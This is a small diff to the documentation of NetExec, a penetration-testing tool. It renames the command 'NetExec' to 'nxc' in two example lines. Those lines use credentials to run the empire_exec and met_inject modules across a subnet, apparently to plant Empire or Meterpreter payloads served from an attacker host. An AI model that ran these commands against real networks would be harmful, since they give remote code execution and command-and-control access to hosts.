@@ -59,7 +59,7 @@ password=abc123
 * Then just run the `empire_exec` module and specify the listener name:
 
 ```
-#~ NetExec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
+#~ nxc 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
 ```
 
 ## Meterpreter
@@ -114,5 +114,5 @@ msf exploit(web_delivery) > run -j
 * Then just run the `met_inject` module and specify the LHOST and LPORT values:
 
 ```
-#~ NetExec 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
+#~ nxc 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
 ```
